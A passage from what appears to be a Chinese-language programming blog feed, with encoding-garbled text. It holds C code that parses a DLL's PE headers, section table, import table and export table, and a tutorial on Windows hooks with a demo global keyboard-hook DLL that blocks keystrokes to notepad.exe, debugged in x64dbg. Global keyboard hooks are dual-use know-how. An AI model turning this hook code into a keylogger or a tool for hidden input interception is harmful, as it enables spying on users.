&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER DosHaeder = imageBase;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;DOSå¤´:%x \n&quot;</span>, DosHaeder-&gt;e_magic);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;PEåç§»:%x \n&quot;</span>, DosHaeder-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">isPE</span><span class="params">(HANDLE imageBase)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);			<span class="comment">//e_lfanewåç§»</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pNthead-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS <span class="title function_">GetNTHead</span><span class="params">(HANDLE imageBase)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);			<span class="comment">//e_lfanewåç§»</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pNthead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> è¯»å–PEæ–‡ä»¶å¤´(HANDLE imageBase) &#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = &amp;pNthead-&gt;FileHeader;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¿è¡Œå¹³å°: %x\n&quot;</span>, pFileHeader-&gt;Machine);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;èŠ‚åŒºæ•°ç›®: %x\n&quot;</span>, pFileHeader-&gt;NumberOfSections);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åˆ›å»ºæ—¥æœŸ: %lu\n&quot;</span>, pFileHeader-&gt;TimeDateStamp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å¯é€‰å¤´å¤§å°: %x\n&quot;</span>, pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶å±æ€§: %0x\n&quot;</span>, pFileHeader-&gt;Machine);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¿è¡Œå¹³å°: 0x%08x\n&quot;</span>, pFileHeader-&gt;Characteristics);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> è¯»å–PEå¯é€‰å¤´(HANDLE imageBase) &#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionalHeader = &amp;pNthead-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å…¥å£ç‚¹: %x\n&quot;</span>, pOptionalHeader-&gt;AddressOfEntryPoint);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åŸºåœ°å€: %x\n&quot;</span>, pOptionalHeader-&gt;ImageBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> è¯»å–èŠ‚è¡¨(HANDLE imageBase)&#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = &amp;pNthead-&gt;FileHeader;</span><br><span class="line">	DWORD NumberOfSectionsCount = pFileHeader-&gt;NumberOfSections;	<span class="comment">//èŠ‚è¡¨æ•°é‡</span></span><br><span class="line"></span><br><span class="line">	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNthead);		<span class="comment">//IMAGE_FIRST_SECTION æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;èŠ‚åŒºåç§°\tRVA_åç§»\tèŠ‚åŒºå¤§å°\tRaw_å°ºå¯¸\tRaw_åç§»\tèŠ‚åŒºå±æ€§\t\n &quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; NumberOfSectionsCount; i++, section++)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>, section-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;VirtualAddress);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;Misc.VirtualSize);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;SizeOfRawData);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t&quot;</span>, section-&gt;PointerToRawData);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x\t\n&quot;</span>, section-&gt;Characteristics);</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> è¯»å–å¯¼å…¥è¡¨(HANDLE imageBase) &#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNthead = GetNTHead(imageBase);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR dllæè¿°ç¬¦ = ImageRvaToVa(pNthead, imageBase, pNthead-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress, <span class="literal">NULL</span>);	<span class="comment">//å­˜æ”¾å„ç§dll</span></span><br><span class="line">	</span><br><span class="line">	PIMAGE_THUNK_DATA stthunk = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwthunk = <span class="literal">NULL</span>;</span><br><span class="line">	USHORT Hint;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å¯¼å…¥è¡¨ä¸º:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å‡½æ•°åœ°å€\tæ¨¡å—åç§°\tå‡½æ•°åç§°\t\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (dllæè¿°ç¬¦-&gt;Name != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span>* æ¨¡å—åç§° = ImageRvaToVa(pNthead, imageBase, dllæè¿°ç¬¦-&gt;Name, <span class="literal">NULL</span>);</span><br><span class="line">		stthunk = ImageRvaToVa(pNthead, imageBase, dllæè¿°ç¬¦-&gt;OriginalFirstThunk, <span class="literal">NULL</span>);</span><br><span class="line">		dwthunk = dllæè¿°ç¬¦-&gt;OriginalFirstThunk;</span><br><span class="line">		<span class="keyword">while</span> (stthunk-&gt;u1.AddressOfData != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_IMPORT_BY_NAME funname = stthunk-&gt;u1.AddressOfData;</span><br><span class="line">			<span class="type">char</span>* å‡½æ•°åç§° = ImageRvaToVa(pNthead, imageBase, funname-&gt;Name, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">if</span> (å‡½æ•°åç§° != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%0.8x\t%s\t%s\n&quot;</span>, dwthunk, æ¨¡å—åç§°, å‡½æ•°åç§°);		 <span class="comment">//dwthunk å‡½æ•°åœ°å€</span></span><br><span class="line">			&#125;</span><br><span class="line">			dwthunk += <span class="number">4</span>;</span><br><span class="line">			stthunk++;</span><br><span class="line">		&#125;</span><br><span class="line">		dllæè¿°ç¬¦++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOID è¯»å–å¯¼å‡ºè¡¨(HANDLE ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExport;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHead = GetNTHead(ImageBase);</span><br><span class="line"></span><br><span class="line">	pExport = ImageRvaToVa(pNtHead, ImageBase, pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (pExport == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;å¯¼å‡ºè¡¨ä¸ºç©º\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD NumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line">	DWORD** ppdwNames = pExport-&gt;AddressOfNames;	</span><br><span class="line"></span><br><span class="line">	ppdwNames = ImageRvaToVa(pNtHead, ImageBase, ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD** ppdwAddr = pExport-&gt;AddressOfFunctions;</span><br><span class="line"></span><br><span class="line">	ppdwAddr = ImageRvaToVa(pNtHead, ImageBase, ppdwAddr, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* szFunction = ImageRvaToVa(pNtHead, ImageBase, *ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å¯¼å‡ºè¡¨ä¸º:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;RVA_åœ°å€\tå‡½æ•°åç§°\t\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; NumberOfNames; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%0.8x\t%s\n&quot;</span>, *ppdwAddr, szFunction);		<span class="comment">// RVA å‡½æ•°åç§°</span></span><br><span class="line">		szFunction = szFunction + <span class="built_in">strlen</span>(szFunction) + <span class="number">1</span>;</span><br><span class="line">		ppdwAddr++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	HANDLE åŸºåœ°å€ = <span class="literal">NULL</span>;</span><br><span class="line">	åŸºåœ°å€ = OpenPe(<span class="string">&quot;C:\\Users\\test\\Desktop\\menuedit.dll&quot;</span>);</span><br><span class="line">	<span class="comment">//åŸºåœ°å€ = OpenPe(&quot;C:\\Users\\test\\Desktop\\32injectdll.dll&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//showDosHeadInfo(åŸºåœ°å€);</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (isPE(åŸºåœ°å€) == TRUE) &#123;</span><br><span class="line">		è¯»å–PEæ–‡ä»¶å¤´(åŸºåœ°å€);</span><br><span class="line">		è¯»å–PEå¯é€‰å¤´(åŸºåœ°å€);</span><br><span class="line">		è¯»å–èŠ‚è¡¨(åŸºåœ°å€);</span><br><span class="line">		è¯»å–å¯¼å…¥è¡¨(åŸºåœ°å€);</span><br><span class="line">		è¯»å–å¯¼å‡ºè¡¨(åŸºåœ°å€);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ä¸æ˜¯PEç»“æ„\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-11_WindowsHook</title>
    <url>/posts/71edaaad/</url>
    <content><![CDATA[<p><strong>Windows HooKé’©å­æŠ€æœ¯æ˜¯æŒ‡åŸºäºWindowsä¸­çª—å£çš„ç¨‹åºçš„æ¶ˆæ¯å¤„ç†æœºåˆ¶ï¼Œå¯¹ç³»ç»Ÿæˆ–è€…è¿›ç¨‹ä¸­çš„æ¶ˆæ¯è¿›è¡Œæˆªè·å’Œå¤„ç†ï¼Œå¹¶å°†æˆªè·å’Œå¤„ç†çš„æ¶ˆæ¯åœ¨é‡æ–°å¤„ç†å’Œå‘é€ï¼Œä½¿å…¶å¯ä»¥å®ç°ä¸åŒçš„åŠŸèƒ½ã€‚</strong></p>
<p>é’©å­æŠ€æœ¯åˆ†ä¸º<strong>ç³»ç»Ÿé’©å­</strong>æŠ€æœ¯å’Œ<strong>çº¿ç¨‹é’©å­</strong>æŠ€æœ¯</p>
<p><strong>ç³»ç»Ÿé’©å­</strong>ï¼šæ˜¯ç”¨äºç›‘è§†ç³»ç»Ÿä¸­çš„æ¶ˆæ¯çš„é’©å­æŠ€æœ¯ï¼Œå› ä¸ºç³»ç»Ÿé’©å­ä¼šå½±å“ç³»ç»Ÿä¸­æ‰€æœ‰çš„åº”ç”¨ç¨‹åºï¼Œæ‰€ä»¥é’©å­å‡½æ•°å¿…é¡»æ”¾åœ¨ç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“(DLL) ä¸­ã€‚åšå¥½ä¹‹åä½¿ç”¨å…¶ä»–ç¨‹åºå°†é’©å­æŒ‚è½½åˆ°ç³»ç»Ÿçš„è¿›ç¨‹ä¸­ã€‚</p>
<p><strong>çº¿ç¨‹é’©å­</strong>ï¼šæŒ‡çš„æ˜¯å¯¹æŒ‡å®šçº¿ç¨‹è¿›è¡Œç›‘è§†ã€‚</p>
<p><strong>é’©å­åŸç†</strong></p>
<p>åœ¨ä½¿ç”¨é’©å­æŠ€æœ¯çš„æ—¶å€™ï¼ŒWINDOWSä¼šå…ˆåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œè¯¥æ•°æ®ç»“æ„åŒ…å«äº†é’©å­çš„ç›¸å…³ä¿¡æ¯ï¼Œç„¶åæŠŠè¯¥ç»“æ„ä½“åŠ åˆ°å·²ç»å­˜åœ¨çš„é’©å­é“¾è¡¨ä¸­å»ã€‚æ–°çš„é’©å­å°†åŠ åˆ°è€çš„å‰é¢ã€‚</p>
<p>å½“ç³»ç»Ÿè§¦å‘äº§ç”Ÿä¸€ä¸ªæ¶ˆæ¯æ—¶ï¼Œå¦‚æœå®‰è£…çš„æ˜¯ä¸€ä¸ªçº¿ç¨‹é’©å­ï¼Œè¿›ç¨‹ä¸­çš„é’©å­å‡½æ•°å°†è¢«è°ƒç”¨ã€‚</p>
<p>å¦‚æœæ˜¯ä¸€ä¸ªç³»ç»Ÿé’©å­ï¼Œç³»ç»Ÿå°±å¿…é¡»æŠŠé’©å­å‡½æ•°æ’å…¥åˆ°å…¶å®ƒè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œè¦åšåˆ°è¿™ä¸€ç‚¹è¦æ±‚é’©å­å‡½æ•°å¿…é¡»åœ¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦ä½¿ç”¨ç³»ç»Ÿé’©å­ï¼Œå°±å¿…é¡»æŠŠè¯¥é’©å­å‡½æ•°æ”¾åˆ°åŠ¨æ€é“¾æ¥åº“ä¸­å»ã€‚</p>
<h4 id="Hook-å‡½æ•°åŠç±»å‹"><a href="#Hook-å‡½æ•°åŠç±»å‹" class="headerlink" title="Hook å‡½æ•°åŠç±»å‹"></a>Hook å‡½æ•°åŠç±»å‹</h4><h5 id="é’©å­ç±»å‹"><a href="#é’©å­ç±»å‹" class="headerlink" title="é’©å­ç±»å‹"></a>é’©å­ç±»å‹</h5><table>
<thead>
<tr>
<th>å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>WH_MSGFILTER</td>
<td>æˆªè·ç”¨æˆ·ä¸æ§ä»¶äº¤äº’çš„æ¶ˆæ¯</td>
</tr>
<tr>
<td>WH_KEYBOARD</td>
<td>æˆªè·é”®ç›˜æ¶ˆæ¯</td>
</tr>
<tr>
<td>WH_GETMESSAGE</td>
<td>æˆªè·ä»æ¶ˆæ¯é˜Ÿåˆ—é€å‡ºçš„æ¶ˆæ¯</td>
</tr>
<tr>
<td>WH_CBT</td>
<td>æˆªè·ç³»ç»ŸåŸºæœ¬æ¶ˆæ¯ï¼Œæ¿€æ´»ï¼Œå»ºç«‹ï¼Œé”€æ¯ï¼Œæœ€å°åŒ–ï¼Œæœ€å¤§åŒ–ï¼Œç§»åŠ¨ï¼Œæ”¹å˜å°ºå¯¸ç­‰çª—å£äº‹ä»¶</td>
</tr>
<tr>
<td>WH_MOUSE</td>
<td>æˆªè·é¼ æ ‡æ¶ˆæ¯</td>
</tr>
<tr>
<td>WH_CALLWNDPROCRET</td>
<td>æˆªè·ç›®æ ‡çª—å£å¤„ç†å®Œæ¯•çš„æ¶ˆæ¯</td>
</tr>
</tbody></table>
<h5 id="SetWindowsHookEx-è®¾ç½®é’©å­"><a href="#SetWindowsHookEx-è®¾ç½®é’©å­" class="headerlink" title="SetWindowsHookEx() è®¾ç½®é’©å­"></a>SetWindowsHookEx() è®¾ç½®é’©å­</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">HHOOK</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//é’©å­ç±»å‹</span></span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">    <span class="comment">//å›è°ƒå‡½æ•°åœ°å€</span></span></span><br><span class="line"><span class="params">    _In_ HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">    <span class="comment">//å®ä¾‹å¥æŸ„(åŒ…å«æœ‰é’©å­å‡½æ•°)</span></span></span><br><span class="line"><span class="params">    _In_opt_ HINSTANCE hmod,</span></span><br><span class="line"><span class="params">    <span class="comment">//çº¿ç¨‹IDï¼Œæ¬²å‹¾ä½çš„çº¿ç¨‹ï¼ˆä¸º0åˆ™ä¸æŒ‡å®šï¼Œå…¨å±€ï¼‰</span></span></span><br><span class="line"><span class="params">    _In_ DWORD dwThreadId)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="UnhookWindowsHookEx-å¸è½½é’©å­"><a href="#UnhookWindowsHookEx-å¸è½½é’©å­" class="headerlink" title="UnhookWindowsHookEx()å¸è½½é’©å­"></a><code>UnhookWindowsHookEx()</code>å¸è½½é’©å­</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">BOOL</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">UnhookWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//è¦åˆ é™¤çš„é’©å­çš„å¥æŸ„ã€‚è¿™ä¸ªå‚æ•°æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°SetWindowsHookExçš„è¿”å›å€¼.</span></span></span><br><span class="line"><span class="params">    _In_ HHOOK hhk)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="CallNextHookEx-å°†é’©å­ä¿¡æ¯ä¼ é€’åˆ°å½“å‰é’©å­é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå­ç¨‹ï¼Œä¸€ä¸ªé’©å­ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ä¹‹å‰æˆ–ä¹‹åå¤„ç†é’©å­ä¿¡æ¯"><a href="#CallNextHookEx-å°†é’©å­ä¿¡æ¯ä¼ é€’åˆ°å½“å‰é’©å­é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå­ç¨‹ï¼Œä¸€ä¸ªé’©å­ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ä¹‹å‰æˆ–ä¹‹åå¤„ç†é’©å­ä¿¡æ¯" class="headerlink" title="**CallNextHookEx()** å°†é’©å­ä¿¡æ¯ä¼ é€’åˆ°å½“å‰é’©å­é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå­ç¨‹ï¼Œä¸€ä¸ªé’©å­ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ä¹‹å‰æˆ–ä¹‹åå¤„ç†é’©å­ä¿¡æ¯"></a><code>**CallNextHookEx()**</code> å°†é’©å­ä¿¡æ¯ä¼ é€’åˆ°å½“å‰é’©å­é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå­ç¨‹ï¼Œä¸€ä¸ªé’©å­ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ä¹‹å‰æˆ–ä¹‹åå¤„ç†é’©å­ä¿¡æ¯</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LRESULT WINAPI <span class="title function_">CallNextHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">	HHOOK hhk, </span></span><br><span class="line"><span class="params">	<span class="type">int</span> nCode, </span></span><br><span class="line"><span class="params">	WPARAM wParam, </span></span><br><span class="line"><span class="params">	LPARAM lParam)</span>; </span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Hook-demo"><a href="#Hook-demo" class="headerlink" title="Hook demo"></a>Hook demo</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	HMODULE dll = LoadLibraryA(<span class="string">&quot;keyboarddll.dll&quot;</span>);</span><br><span class="line">	<span class="type">void</span> (*HookStart)() = (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStart&quot;</span>);</span><br><span class="line">	<span class="type">void</span>(*HookStop)()= (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStop&quot;</span>);</span><br><span class="line">	HookStart();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¾“å…¥qé€€å‡ºå¸è½½é’©å­\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);		</span><br><span class="line"></span><br><span class="line">	HookStop();</span><br><span class="line"></span><br><span class="line">	FreeLibrary(dll); <span class="comment">//å¸è½½dll</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span>* p = <span class="literal">NULL</span>;   <span class="comment">//ä»å³ä¾§æ‰¾ å…ˆå®šä¹‰ä¸€ä¸ªæŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(lparam &amp; <span class="number">0x80000000</span>)) &#123;          <span class="comment">//32ä½ä¸‹  æœ€é«˜ä½ç½®ä¸º1  0x8000 0000</span></span><br><span class="line">            GetModuleFileNameA(<span class="literal">NULL</span>, szBuffer, <span class="keyword">sizeof</span>(szBuffer));</span><br><span class="line">            p = <span class="built_in">strrchr</span>(szBuffer,<span class="string">&#x27;\\&#x27;</span>);   <span class="comment">//ä»å³è¾¹æ‰¾</span></span><br><span class="line">            <span class="keyword">if</span> (!_strcmpi(p+<span class="number">1</span>, <span class="string">&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//ç»™ä¸‹ä¸€ä¸ªé’©å­å¤„ç†æˆ–è€…ç»™åº”ç”¨ç¨‹åº</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//å®‰è£…é’©å­</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//å¸è½½é’©å­</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                      DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                      LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    	hinstance = hModule;        <span class="comment">//åœ¨è½½å…¥æ—¶è·å–  åé¢æ— æ³•è·å–</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨é’©å­hookä½notepad  ç”±äºnotepadæ˜¯64ä½çš„ï¼Œæ‰€æœ‰è¦ç¼–è¯‘æˆ64ä½åº”ç”¨ç¨‹åº ä½¿ç”¨x64dbgè¿›è¡Œè°ƒè¯•  ï¼ˆæ²¡æ³•ä½¿ç”¨odè°ƒè¯•  odåªèƒ½è°ƒè¯•32ä½ï¼‰</p>
<p>æ‰“å¼€x64dbg ç‚¹å‡» æ–‡ä»¶-&gt;é™„åŠ  é™„åŠ notepad.exe</p>
<p><img src="/posts/71edaaad/11-1.png" alt="img"></p>
<p>ç„¶åç‚¹å‡» é€‰é¡¹-&gt;é€‰é¡¹</p>
<p><img src="/posts/71edaaad/11-2.png" alt="img"></p>
<p>æ‰“å¼€dllåŠ è½½æ—¶å‘ç”Ÿæš‚åœ</p>
<p><img src="/posts/71edaaad/11-3.png" alt="img"></p>
<p>ç‚¹å‡»è§†å›¾-&gt;æ¨¡å—  ç„¶åè¿è¡Œé’©å­ åœ¨notepadä¸­éšæ„è¾“å…¥ä¸€ä¸‹ å³å¯çœ‹åˆ°åœ¨x64dbgåä¸‹æ–¹è½½å…¥ä¹‹å‰ç¼–å†™çš„dll</p>
<p><img src="/posts/71edaaad/11-4.png" alt="img"></p>
<hr>
